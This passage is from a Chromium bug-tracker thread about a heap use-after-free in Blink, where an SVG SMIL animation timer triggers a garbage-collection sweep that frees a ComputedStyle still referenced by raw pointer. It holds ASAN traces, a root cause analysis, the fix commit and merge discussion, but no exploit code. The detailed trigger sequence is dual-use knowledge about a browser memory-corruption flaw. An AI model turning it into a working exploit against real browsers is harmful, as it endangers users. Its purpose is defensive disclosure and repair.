    #32 0x5646f871db89 in ExpandCapacity //third_party/blink/renderer/platform/wtf/vector.h:1573:3
    #33 0x5646f871db89 in ExpandCapacity //third_party/blink/renderer/platform/wtf/vector.h:1582:0
    #34 0x5646f871db89 in void WTF::Vector<blink::MatchedRule, 32u, blink::HeapAllocator>::AppendSlowCase<blink::MatchedRule>(blink::MatchedRule&&) //third_party/blink/renderer/platform/wtf/vector.h:1778:0
    #35 0x5646f871914b in push_back<blink::MatchedRule> //third_party/blink/renderer/platform/wtf/vector.h:1735:3
    #36 0x5646f871914b in blink::ElementRuleCollector::DidMatchRule(blink::RuleData const*, blink::SelectorChecker::MatchResult const&, unsigned int, blink::MatchRequest const&) //third_party/blink/renderer/core/css/element_rule_collector.cc:356:0
    #37 0x5646f8716df5 in void blink::ElementRuleCollector::CollectMatchingRulesForList<blink::HeapVector<blink::Member<blink::RuleData const>, 0u> >(blink::HeapVector<blink::Member<blink::RuleData const>, 0u> const*, unsigned int, blink::MatchRequest const&, blink::PartNames*) //third_party/blink/renderer/core/css/element_rule_collector.cc:174:5
    #38 0x5646f871603e in blink::ElementRuleCollector::CollectMatchingRules(blink::MatchRequest const&, unsigned int, bool) //third_party/blink/renderer/core/css/element_rule_collector.cc:248:3
    #39 0x5646f86d5629 in MatchRuleSet //third_party/blink/renderer/core/css/resolver/style_resolver.cc:541:13
    #40 0x5646f86d5629 in blink::StyleResolver::MatchUARules(blink::ElementRuleCollector&) //third_party/blink/renderer/core/css/resolver/style_resolver.cc:523:0
    #41 0x5646f86d5b82 in blink::StyleResolver::MatchAllRules(blink::StyleResolverState&, blink::ElementRuleCollector&, bool) //third_party/blink/renderer/core/css/resolver/style_resolver.cc:549:3
    #42 0x5646f86d8be3 in blink::StyleResolver::StyleForElement(blink::Element*, blink::ComputedStyle const*, blink::ComputedStyle const*, blink::RuleMatchingBehavior) //third_party/blink/renderer/core/css/resolver/style_resolver.cc:774:5
    #43 0x5646faaf8a74 in blink::SVGElement::CustomStyleForLayoutObject() //third_party/blink/renderer/core/svg/svg_element.cc:0:0
    #44 0x5646f89e846c in blink::Element::StyleForLayoutObject(bool) //third_party/blink/renderer/core/dom/element.cc:2330:46
    #45 0x5646f89ea3f1 in blink::Element::RecalcOwnStyle(blink::StyleRecalcChange) //third_party/blink/renderer/core/dom/element.cc:2512:19
    #46 0x5646f89e916a in blink::Element::RecalcStyle(blink::StyleRecalcChange) //third_party/blink/renderer/core/dom/element.cc:2382:20
    #47 0x5646f887fb85 in blink::ContainerNode::RecalcDescendantStyles(blink::StyleRecalcChange) //third_party/blink/renderer/core/dom/container_node.cc:1405:25
    #48 0x5646f89e9580 in blink::Element::RecalcStyle(blink::StyleRecalcChange) //third_party/blink/renderer/core/dom/element.cc:2402:7
    #49 0x5646f887fb85 in blink::ContainerNode::RecalcDescendantStyles(blink::StyleRecalcChange) //third_party/blink/renderer/core/dom/container_node.cc:1405:25
    #50 0x5646f89e9580 in blink::Element::RecalcStyle(blink::StyleRecalcChange) //third_party/blink/renderer/core/dom/element.cc:2402:7
    #51 0x5646f87c7d6a in blink::StyleEngine::RecalcStyle(blink::StyleRecalcChange) //third_party/blink/renderer/core/css/style_engine.cc:1727:38
    #52 0x5646f88c8693 in blink::Document::UpdateStyle() //third_party/blink/renderer/core/dom/document.cc:2347:24
    #53 0x5646f88bbd60 in blink::Document::UpdateStyleAndLayoutTree() //third_party/blink/renderer/core/dom/document.cc:2256:3
    #54 0x5646f88ca619 in blink::Document::UpdateStyleAndLayoutTreeForNode(blink::Node const*) //third_party/blink/renderer/core/dom/document.cc:2460:3
    #55 0x5646f81a46a9 in blink::CSSComputedStyleDeclaration::GetPropertyCSSValue(blink::CSSProperty const&) const //third_party/blink/renderer/core/css/css_computed_style_declaration.cc:380:12
    #56 0x5646f81a3910 in blink::CSSComputedStyleDeclaration::GetPropertyValue(blink::CSSPropertyID) const //third_party/blink/renderer/core/css/css_computed_style_declaration.cc:416:27
    #57 0x5646faab9e79 in ComputeCSSPropertyValue //third_party/blink/renderer/core/svg/svg_animate_element.cc:59:24
    #58 0x5646faab9e79 in blink::SVGAnimateElement::ResetAnimatedType() //third_party/blink/renderer/core/svg/svg_animate_element.cc:441:0
    #59 0x5646faa76f3d in blink::SMILTimeContainer::UpdateAnimations(double, bool) //third_party/blink/renderer/core/svg/animation/smil_time_container.cc:493:25
    #60 0x5646faa749b4 in blink::SMILTimeContainer::UpdateAnimationsAndScheduleFrameIfNeeded(double, bool) //third_party/blink/renderer/core/svg/animation/smil_time_container.cc:414:33
    #61 0x5646f7dc585a in blink::TimerBase::RunInternal() //third_party/blink/renderer/platform/timer.cc:156:3
    #62 0x5646f2222e83 in Run //base/callback.h:97:12
    #63 0x5646f2222e83 in base::TaskAnnotator::RunTask(char const*, base::PendingTask*) //base/task/common/task_annotator.cc:119:0
    #64 0x5646f2259742 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::sequence_manager::LazyNow*, bool*) //base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:339:23
    #65 0x5646f2259147 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoSomeWork() //base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:220:7
    #66 0x5646f218ad20 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) //base/message_loop/message_pump_default.cc:39:55
    #67 0x5646f225affb in Run //base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:408:12
    #68 0x5646f225affb in non-virtual thunk to base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool) //base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:0:0
    #69 0x5646f21e31d7 in base::RunLoop::Run() //base/run_loop.cc:157:14
    #70 0x5646fdfc16eb in content::RendererMain(content::MainFunctionParams const&) //content/renderer/renderer_main.cc:223:16
    #71 0x5646eff0acdd in content::RunZygote(content::ContentMainDelegate*) //content/app/content_main_runner_impl.cc:513:14
    #72 0x5646eff0e2aa in content::ContentMainRunnerImpl::Run(bool) //content/app/content_main_runner_impl.cc:881:10
    #73 0x5646f7005d64 in service_manager::Main(service_manager::MainParams const&) //services/service_manager/embedder/main.cc:415:29
    #74 0x5646ed50a824 in content::ContentMain(content::ContentMainParams const&) //content/app/content_main.cc:19:10
    #75 0x5646eacafb4b in main //content/shell/app/shell_main.cc:39:10
    #76 0x7fd10e4b62b0 in __libc_start_main ??:0:0

Looks like it's possibly being freed within the same ResetAnimatedType() call.

### al...@chromium.org (2019-04-02)

Strange, this does not repro with dchecks_always_enabled = true.

### al...@chromium.org (2019-04-02)

+fs, pdr: I'm not so familiar with SMIL, do you know what might've gone wrong such that DCHECK(animation->HasValidTarget()) fails inside SMILTimeContainer::UpdateAnimations()?

Note that executing animation->HasValidTarget() does not trigger the UAF under ASAN.

[Monorail components: -Blink>CSS Blink>SVG]

### al...@chromium.org (2019-04-02)

I considered making the turning the DCHECK(animation->HasValidTarget()) into a CHECK as a quick security fix but it flakily hits either the CHECK or the UAF.

### al...@chromium.org (2019-04-02)

I added "state->CompleteSweep()" to the end of HeapAllocator::BackingFree() to try and get the freeing happening sooner to when it actually happens logically and got a slightly different freeing callstack:


0x6080000847c8 is located 40 bytes inside of 96-byte region [0x6080000847a0,0x608000084800)
freed by thread T0 (content_shell) here:
    #0 0x55dab40efd4d in __interceptor_free _asan_rtl_:3
    #1 0x55dac1f2758b in SetComputedStyle node.cc:183:3
    #2 0x55dac1f2758b in blink::Node::SetComputedStyle(scoped_refptr<blink::ComputedStyle>) node.cc:927:0
    #3 0x55dac1e55ff7 in blink::Element::DetachLayoutTree(blink::Node::AttachContext const&) element.cc:2297:5
    #4 0x55dac3f57851 in blink::SVGElement::DetachLayoutTree(blink::Node::AttachContext const&) svg_element.cc:84:12
    #5 0x55dac1ce768d in blink::ContainerNode::DetachLayoutTree(blink::Node::AttachContext const&) container_node.cc:987:12
    #6 0x55dac1d3cd44 in blink::Document::Shutdown() document.cc:2804:18
    #7 0x55dac25b5dbf in blink::LocalFrame::DetachImpl(blink::FrameDetachType) local_frame.cc:417:18
    #8 0x55dac25748e5 in blink::Frame::Detach(blink::FrameDetachType) frame.cc:81:3
    #9 0x55dac39e95d6 in blink::Page::WillBeDestroyed() page.cc:811:15
    #10 0x55dac3ed476b in blink::SVGImage::~SVGImage() svg_image.cc:111:19
    #11 0x55dac3ed486d in blink::SVGImage::~SVGImage() svg_image.cc:102:23
    #12 0x55dac38f5182 in DeleteInternal<blink::Image> thread_safe_ref_counted.h:64:5
    #13 0x55dac38f5182 in Destruct thread_safe_ref_counted.h:44:0
    #14 0x55dac38f5182 in Release ref_counted.h:403:0
    #15 0x55dac38f5182 in Release scoped_refptr.h:297:0
    #16 0x55dac38f5182 in ~scoped_refptr scoped_refptr.h:209:0
    #17 0x55dac38f5182 in ~ImageResourceContent image_resource_content.h:43:0
    #18 0x55dac38f5182 in FinalizeGarbageCollectedObject garbage_collected.h:211:0
    #19 0x55dac38f5182 in Finalize finalizer_traits.h:30:0
    #20 0x55dac38f5182 in blink::FinalizerTrait<blink::ImageResourceContent>::Finalize(void*) finalizer_traits.h:56:0
    #21 0x55dab8d18c16 in Finalize heap_page.cc:103:5
    #22 0x55dab8d18c16 in blink::NormalPage::Sweep() heap_page.cc:1342:0
    #23 0x55dab8d11b0a in SweepUnsweptPage heap_page.cc:282:31
    #24 0x55dab8d11b0a in blink::BaseArena::CompleteSweep() heap_page.cc:338:0
    #25 0x55dab8cfb8b2 in blink::ThreadHeap::CompleteSweep() heap.cc:418:17
    #26 0x55dab8d244b4 in blink::ThreadState::CompleteSweep() thread_state.cc:1053:12
    #27 0x55dab8d07c62 in blink::HeapAllocator::BackingFree(void*) heap_allocator.cc:33:10
    #28 0x55dac1b89971 in DeallocateBuffer vector.h:502:5
    #29 0x55dac1b89971 in WTF::Vector<blink::MatchedRule, 32u, blink::HeapAllocator>::ShrinkCapacity(unsigned int) vector.h:1718:0
    #30 0x55dac1b44b8a in MatchUserRules style_resolver.cc:509:13
    #31 0x55dac1b44b8a in blink::StyleResolver::MatchAllRules(blink::StyleResolverState&, blink::ElementRuleCollector&, bool) style_resolver.cc:550:0
    #32 0x55dac1b47be3 in blink::StyleResolver::StyleForElement(blink::Element*, blink::ComputedStyle const*, blink::ComputedStyle const*, blink::RuleMatchingBehavior) style_resolver.cc:774:5
    #33 0x55dac3f67c14 in blink::SVGElement::CustomStyleForLayoutObject() svg_element.cc:0:0
    #34 0x55dac1e5746c in blink::Element::StyleForLayoutObject(bool) element.cc:2330:46
    #35 0x55dac1e593f1 in blink::Element::RecalcOwnStyle(blink::StyleRecalcChange) element.cc:2512:19
    #36 0x55dac1e5816a in blink::Element::RecalcStyle(blink::StyleRecalcChange) element.cc:2382:20
    #37 0x55dac1ceeb85 in blink::ContainerNode::RecalcDescendantStyles(blink::StyleRecalcChange) container_node.cc:1405:25
    #38 0x55dac1e58580 in blink::Element::RecalcStyle(blink::StyleRecalcChange) element.cc:2402:7
    #39 0x55dac1ceeb85 in blink::ContainerNode::RecalcDescendantStyles(blink::StyleRecalcChange) container_node.cc:1405:25
    #40 0x55dac1e58580 in blink::Element::RecalcStyle(blink::StyleRecalcChange) element.cc:2402:7
    #41 0x55dac1c36d6a in blink::StyleEngine::RecalcStyle(blink::StyleRecalcChange) style_engine.cc:1727:38
    #42 0x55dac1d37693 in blink::Document::UpdateStyle() document.cc:2347:24
    #43 0x55dac1d2ad60 in blink::Document::UpdateStyleAndLayoutTree() document.cc:2256:3
    #44 0x55dac1d39619 in blink::Document::UpdateStyleAndLayoutTreeForNode(blink::Node const*) document.cc:2460:3
    #45 0x55dac16136a9 in blink::CSSComputedStyleDeclaration::GetPropertyCSSValue(blink::CSSProperty const&) const css_computed_style_declaration.cc:380:12
    #46 0x55dac1612910 in blink::CSSComputedStyleDeclaration::GetPropertyValue(blink::CSSPropertyID) const css_computed_style_declaration.cc:416:27
    #47 0x55dac3f29019 in ComputeCSSPropertyValue svg_animate_element.cc:59:24
    #48 0x55dac3f29019 in blink::SVGAnimateElement::ResetAnimatedType() svg_animate_element.cc:441:0
    #49 0x55dac3ee605a in blink::SMILTimeContainer::UpdateAnimations(double, bool) smil_time_container.cc:485:25
    #50 0x55dac3ee39b4 in blink::SMILTimeContainer::UpdateAnimationsAndScheduleFrameIfNeeded(double, bool) smil_time_container.cc:414:33
    #51 0x55dac123485a in blink::TimerBase::RunInternal() timer.cc:156:3
    #52 0x55dabb691e93 in Run callback.h:97:12
    #53 0x55dabb691e93 in base::TaskAnnotator::RunTask(char const*, base::PendingTask*) task_annotator.cc:119:0
    #54 0x55dabb6c8752 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::sequence_manager::LazyNow*, bool*) thread_controller_with_message_pump_impl.cc:339:23
    #55 0x55dabb6c8157 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoSomeWork() thread_controller_with_message_pump_impl.cc:220:7
    #56 0x55dabb5f9d30 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) message_pump_default.cc:39:55
    #57 0x55dabb6ca00b in Run thread_controller_with_message_pump_impl.cc:408:12
    #58 0x55dabb6ca00b in non-virtual thunk to base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool) thread_controller_with_message_pump_impl.cc:0:0
    #59 0x55dabb6521e7 in base::RunLoop::Run() run_loop.cc:157:14
    #60 0x55dac743088b in content::RendererMain(content::MainFunctionParams const&) renderer_main.cc:223:16
    #61 0x55dab9379ced in content::RunZygote(content::ContentMainDelegate*) content_main_runner_impl.cc:513:14
    #62 0x55dab937d2ba in content::ContentMainRunnerImpl::Run(bool) content_main_runner_impl.cc:881:10
    #63 0x55dac0474d64 in service_manager::Main(service_manager::MainParams const&) main.cc:415:29
    #64 0x55dab6979824 in content::ContentMain(content::ContentMainParams const&) content_main.cc:19:10
    #65 0x55dab411eb4b in main shell_main.cc:39:10
    #66 0x7f703ec0a2b0 in __libc_start_main ??:0:0

Of note is the call to StyleResolver::MatchUserRules() style_resolver.cc:550 which is calling collector.ClearMatchedRules() which clears its Member<StyleRule>s that probably hold a Member<CSSImageValue> holding a Member<StyleFetchedImage> cache which holds the Member<ImageResourceContent> that we see being freed in the stack above.

### al...@chromium.org (2019-04-02)

In progress thoughts...

So why is the SMILTimeContainer object still alive in this scenario? Why does the timer fire? The Document holding it is presumably dead.
My guess is when the TaskRunnerTimer<SMILTimeContainer> wakeup_timer_ checks CanFire() the scoped_refptr<blink::Image> is keeping the SMILTimeContainer alive along with the entire Document. In the execution of SMILTimeContainer::UpdateAnimations() we lose a ref on the blink::Image which eagerly deletes all non-GC'd objects under its ownership including the ComputedStyle.

Red flag: The CSSToLengthConversionData object inside the StyleResolverState contains a raw pointer to a ComputedStyle. According to the UAF stack trace it's that raw pointer that's the dangling one.

Moving this back to Blink>CSS component as the free then UAF seems to be happening within the same StyleResolver::StyleForElement() call so it's probably a CSS bug that's triggered by this unconventional scenario.

I'm heading home at the moment. +futhark for async style resolver halp.

[Monorail components: -Blink>SVG Blink>CSS]

### fs...@opera.com (2019-04-02)

What you have here is a "zombie" SVGImage - an SVGImage that is no longer referenced[1] but not yet swept. The SMIL engine has setup a timer to perform an interval update. When this timer fires (the object still being in limbo), the SMIL engine updates intervals and values. When doing this a sweep is triggered, resulting in the SVGImage being torn down [2]. This detaches the SVGImage's Document which clears out the ComputedStyle that we were about to poke at higher up in the stack.
Now, the (SVG)Image::ResetAnimation is what's supposed to have stopped the wake-up timer when client/observer count dropped to zero on the ImageResource (or ImageResourceContent - they are somewhat intertwined). The relevant client/observer in this case ought to be the StyleImage (itself) from the background-image as well as any client of the StyleImage (#id11). Might be worth checking that clients/observers are unregistered properly as a start.

[1] Indirectly, because it's a ref-counted object, but the primary owner - the ImageResourceContent - is on the GC-heap.
[2] Via finalization of the ImageResourceContent.

### al...@chromium.org (2019-04-02)

Reading into the timer code it seems that it shouldn't be in such a limbo state:
  bool CanFire() const override {
    // Oilpan: if a timer fires while Oilpan heaps are being lazily
    // swept, it is not safe to proceed if the object is about to
    // be swept (and this timer will be stopped while doing so.)
    return TimerIsObjectAliveTrait<TimerFiredClass>::IsHeapObjectAlive(object_);
  }
Or perhaps having a ref counted object somewhere in the ownership chain makes the real situation opaque to IsHeapObjectAlive()...

### cl...@chromium.org (2019-04-03)

[Empty comment from Monorail migration]

### fs...@opera.com (2019-04-03)

The "timer object" is the SMILTimeContainer, which lives inside the document inside the SVGImage, and the SVGImage is ref-counted.

### al...@chromium.org (2019-04-06)

Logging calls to NodeRenderingData::SetComputedStyle() confirms that the last freed ComputedStyle from that location is the corresponding UAF'd ComputedStyle.

[1:1:0406/122746.910881:ERROR:smil_time_container.cc(485)] ResetAnimatedType{
[1:1:0406/122746.911072:ERROR:node.cc(182)] 0x6080001a6220
[1:1:0406/122746.911695:ERROR:node.cc(182)] 0x6080001a64a0
[1:1:0406/122746.912439:ERROR:node.cc(182)] 0x6080001a8d20
[1:1:0406/122746.912556:ERROR:node.cc(182)] 0x6080001a6020
[1:1:0406/122746.912674:ERROR:node.cc(182)] (nil)
[1:1:0406/122746.913266:ERROR:node.cc(182)] 0x6080001a6920
[1:1:0406/122746.913334:ERROR:node.cc(182)] 0x6080001a6fa0
[1:1:0406/122746.913401:ERROR:node.cc(182)] 0x6080001a7a20
[1:1:0406/122746.913465:ERROR:node.cc(182)] 0x6080001a68a0
[1:1:0406/122746.913544:ERROR:node.cc(182)] 0x6080001a5e20
=================================================================
==1==ERROR: AddressSanitizer: heap-use-after-free on address 0x6080001a5e48 at pc 0x5582cd559dd8 bp 0x7ffccd551040 sp 0x7ffccd551038
...
0x6080001a5e48 is located 40 bytes inside of 96-byte region [0x6080001a5e20,0x6080001a5e80)
freed by thread T0 (content_shell) here:

### al...@chromium.org (2019-04-06)

Calling ThreadState::Current()->CompleteSweep() before the call to result_element->ResetAnimatedType() results in the UAF no longer being hit.

### al...@chromium.org (2019-04-06)

Root cause analysis:
  Memory ownership state:
    <no owner>
      ImageResourceContent has a
        scoped_refptr<SVGImage> image_ which has a
          Persistent<Page> page_ which has a
            Member<Frame> main_frame_ which has a
              Member<LocalDOMWindow> dom_window_ which has a
                Member<Document> document_ which has a
                  Member<Element> document_element_ which has a
                    Member<SVGSVGElement> next_ which has a
                      Member<SMILTimeContainer> time_container_

  Sequence of execution leading to the UAF:
    TaskRunnerTimer::CanFire() calls
      IsHeapObjectAlive() on the SMILTimeContainer which is true due to the Persistent<Page> root which enables
        SMILTimeContainer::wakeup_timer_ to call SMILTimeContainer::WakeupTimerFired() which calls
          CSSComputedStyleDeclaration::GetPropertyValue() which calls
            StyleResolver::StyleForElement() which
              takes a raw const ComputedStyle* pointer to the root element style
              and may invoke a GC sweep that calls
                ~ImageResourceContent() which calls
                  ~SVGImage() which calls
                    Page::WillBeDestroyed() which manually clears all
                      Node LayoutObjects which derefs all
                        ComputedStyle objects including the
                          root element style which now has a
                            dangling raw pointer to it


### al...@chromium.org (2019-04-06)

If I make ElementResolveContent::root_computed_style_ a scoped_refptr instead of a raw pointer then this test case crashes on:

Received signal 11 SEGV_MAPERR 0000000000b0
    #0 0x556f543fdeeb in __interceptor_backtrace /b/swarming/w/ir/k/src/third_party/llvm/compiler-rt/lib/asan/../sanitizer_common/sanitizer_common_interceptors.inc:4065:13
    #1 0x556f5b854829 in base::debug::CollectStackTrace(void**, unsigned long) ./../../base/debug/stack_trace_posix.cc:818:39
    #2 0x556f5b644723 in StackTrace ./../../base/debug/stack_trace.cc:206:12
    #3 0x556f5b644723 in base::debug::StackTrace::StackTrace() ./../../base/debug/stack_trace.cc:203:0
    #4 0x556f5b85389a in base::debug::(anonymous namespace)::StackDumpSignalHandler(int, siginfo_t*, void*) ./../../base/debug/stack_trace_posix.cc:341:3
    #5 0x7f74ce01e0c0 in __funlockfile ??:?
    #6 0x7f74ce01e0c0 in ?? ??:0
    #7 0x556f61a0f565 in operator blink::RuleSet * ./../../third_party/blink/renderer/platform/heap/member.h:0:32
    #8 0x556f61a0f565 in WatchedSelectorsRuleSet ./../../third_party/blink/renderer/core/css/css_global_rule_set.h:40:0
    #9 0x556f61a0f565 in WatchedSelectorsRuleSet ./../../third_party/blink/renderer/core/css/style_engine.h:147:0
    #10 0x556f61a0f565 in blink::StyleResolver::ApplyCallbackSelectors(blink::StyleResolverState&) ./../../third_party/blink/renderer/core/css/resolver/style_resolver.cc:1954:0
    #11 0x556f61a0c1b7 in blink::StyleResolver::StyleForElement(blink::Element*, blink::ComputedStyle const*, blink::ComputedStyle const*, blink::RuleMatchingBehavior) ./../../third_party/blink/renderer/core/css/resolver/style_resolver.cc:818:5
    #12 0x556f63e24dd5 in blink::SVGElement::CustomStyleForLayoutObject() ./../../third_party/blink/renderer/core/svg/svg_element.cc:0:0
    #13 0x556f61d12d4d in blink::Element::StyleForLayoutObject(bool) ./../../third_party/blink/renderer/core/dom/element.cc:2331:46
    #14 0x556f61d14cd2 in blink::Element::RecalcOwnStyle(blink::StyleRecalcChange) ./../../third_party/blink/renderer/core/dom/element.cc:2513:19
    #15 0x556f61d13a4b in blink::Element::RecalcStyle(blink::StyleRecalcChange) ./../../third_party/blink/renderer/core/dom/element.cc:2383:20
    #16 0x556f61bacff6 in blink::ContainerNode::RecalcDescendantStyles(blink::StyleRecalcChange) ./../../third_party/blink/renderer/core/dom/container_node.cc:1405:25
    #17 0x556f61d13e61 in blink::Element::RecalcStyle(blink::StyleRecalcChange) ./../../third_party/blink/renderer/core/dom/element.cc:2403:7
    #18 0x556f61afa69b in blink::StyleEngine::RecalcStyle(blink::StyleRecalcChange) ./../../third_party/blink/renderer/core/css/style_engine.cc:1727:38
    #19 0x556f61bf4cc4 in blink::Document::UpdateStyle() ./../../third_party/blink/renderer/core/dom/document.cc:2339:24
    #20 0x556f61be8a71 in blink::Document::UpdateStyleAndLayoutTree() ./../../third_party/blink/renderer/core/dom/document.cc:2248:3
    #21 0x556f61bf6c4a in blink::Document::UpdateStyleAndLayoutTreeForNode(blink::Node const*) ./../../third_party/blink/renderer/core/dom/document.cc:2452:3
    #22 0x556f614e33aa in blink::CSSComputedStyleDeclaration::GetPropertyCSSValue(blink::CSSProperty const&) const ./../../third_party/blink/renderer/core/css/css_computed_style_declaration.cc:380:12
    #23 0x556f614e2611 in blink::CSSComputedStyleDeclaration::GetPropertyValue(blink::CSSPropertyID) const ./../../third_party/blink/renderer/core/css/css_computed_style_declaration.cc:416:27
    #24 0x556f63de61da in ComputeCSSPropertyValue ./../../third_party/blink/renderer/core/svg/svg_animate_element.cc:59:24
    #25 0x556f63de61da in blink::SVGAnimateElement::ResetAnimatedType() ./../../third_party/blink/renderer/core/svg/svg_animate_element.cc:441:0


which isn't a UAF so security bug fixed!

I think a proper non-crashing fix would be to make Page::WillBeDestroyed() post a task to do the actual clean up instead of doing it synchronously but that's a much riskier change to make that wouldn't be safe to merge.

### fs...@opera.com (2019-04-06)

I think that a better fix strategy would be to find out why the wakeup timer hasn't been stopped. I think it ought to be stopped by the StyleFetchedImage's pre-finalizer in this case (leading to a call to SVGImage::ResetAnimation).

Happy to help, but I'll be travelling and attend BlinkOn next week...

### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-04-11)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/09f046d4a935c739f364c531c3b0059121e8a98e

commit 09f046d4a935c739f364c531c3b0059121e8a98e
Author: Alan Cutter <alancutter@chromium.org>
Date: Thu Apr 11 19:37:36 2019

Make ElementResolveContext hold a ref to the root element's ComputedStyle

Bug: 947029
Change-Id: I167aad139398a808d170f39e72c5eef57f142e11
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1556653
Auto-Submit: Alan Cutter <alancutter@chromium.org>
Commit-Queue: Rune Lillesveen <futhark@chromium.org>
Reviewed-by: Rune Lillesveen <futhark@chromium.org>
Cr-Commit-Position: refs/heads/master@{#650001}
[modify] https://crrev.com/09f046d4a935c739f364c531c3b0059121e8a98e/third_party/blink/renderer/core/css/resolver/element_resolve_context.h


### al...@chromium.org (2019-04-11)

#0 would you be able to double check on your end that this ASAN violation is fixed now?

### al...@chromium.org (2019-04-15)

Request to merge commit 09f046d4a935c739f364c531c3b0059121e8a98e to 74. A non-risky change that improves memory safety.

### sh...@chromium.org (2019-04-15)

This bug requires manual review: We are only 7 days from stable.
Please contact the milestone owner if you have questions.
Owners: govind@(Android), kariahda@(iOS), dgagnon@(ChromeOS), abdulsyed@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### go...@chromium.org (2019-04-15)

+ adetaylor@ (Security TPM) for M74 merge review

+ abdulsyed@ (M74 Desktop Release TPM) for visibility. 

### ab...@google.com (2019-04-15)

alancutter@ - what are the memory benefits specifically? Are we okay waiting til 75 for this? We're less a week away from M74 stable, and if this isn't necessarily a new regression in 74, I'd like to punt it to 75. 

### ad...@chromium.org (2019-04-15)

FWIW I'd be enthusiastic for a merge even at this late stage. It's a very low risk fix, and as a UaF it may be exploitable.



### sh...@chromium.org (2019-04-15)

Please mark security bugs as fixed as soon as the fix lands, and before requesting merges. This update is based on the merge- labels applied to this issue. Please reopen if this update was incorrect.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### go...@chromium.org (2019-04-15)

Approving merge to M74 branch 3729 based on https://crbug.com/chromium/947029#c29. Please merge ASAP. Thank you.

### na...@google.com (2019-04-15)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-04-15)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/f39fe34db941fded3358f94e8108a1fd7f4d9b90

commit f39fe34db941fded3358f94e8108a1fd7f4d9b90
Author: Alan Cutter <alancutter@chromium.org>
Date: Mon Apr 15 22:37:39 2019

Make ElementResolveContext hold a ref to the root element's ComputedStyle

Bug: 947029
Change-Id: I167aad139398a808d170f39e72c5eef57f142e11
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1556653
Auto-Submit: Alan Cutter <alancutter@chromium.org>
Commit-Queue: Rune Lillesveen <futhark@chromium.org>
Reviewed-by: Rune Lillesveen <futhark@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#650001}(cherry picked from commit 09f046d4a935c739f364c531c3b0059121e8a98e)
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1568194
Reviewed-by: Alan Cutter <alancutter@chromium.org>
Cr-Commit-Position: refs/branch-heads/3729@{#835}
Cr-Branched-From: d4a8972e30b604f090aeda5dfff68386ae656267-refs/heads/master@{#638880}
[modify] https://crrev.com/f39fe34db941fded3358f94e8108a1fd7f4d9b90/third_party/blink/renderer/core/css/resolver/element_resolve_context.h


### cr...@appspot.gserviceaccount.com (2019-04-15)

The following revision refers to this bug: 
https://chromium.googlesource.com/chromium/src.git/+/f39fe34db941fded3358f94e8108a1fd7f4d9b90

Commit: f39fe34db941fded3358f94e8108a1fd7f4d9b90
Author: alancutter@chromium.org
Commiter: alancutter@chromium.org
Date: 2019-04-15 22:37:39 +0000 UTC

Make ElementResolveContext hold a ref to the root element's ComputedStyle

Bug: 947029
Change-Id: I167aad139398a808d170f39e72c5eef57f142e11
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1556653
Auto-Submit: Alan Cutter <alancutter@chromium.org>
Commit-Queue: Rune Lillesveen <futhark@chromium.org>
Reviewed-by: Rune Lillesveen <futhark@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#650001}(cherry picked from commit 09f046d4a935c739f364c531c3b0059121e8a98e)
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1568194
Reviewed-by: Alan Cutter <alancutter@chromium.org>
Cr-Commit-Position: refs/branch-heads/3729@{#835}
Cr-Branched-From: d4a8972e30b604f090aeda5dfff68386ae656267-refs/heads/master@{#638880}

### sh...@chromium.org (2019-04-16)

[Empty comment from Monorail migration]

### aw...@google.com (2019-04-17)

[Empty comment from Monorail migration]

### na...@google.com (2019-04-18)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### pa...@chromium.org (2019-04-18)

Congrats! The Panel decided to reward $3,000 for this report!

### aw...@google.com (2019-04-19)

[Empty comment from Monorail migration]

### aw...@chromium.org (2019-04-22)

[Empty comment from Monorail migration]

### mm...@chromium.org (2019-05-13)

[Empty comment from Monorail migration]

### mm...@chromium.org (2019-05-17)

[Empty comment from Monorail migration]

### aw...@chromium.org (2019-06-27)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-07-23)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2019-07-23)

This issue was migrated from crbug.com/chromium/947029?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40094422)*
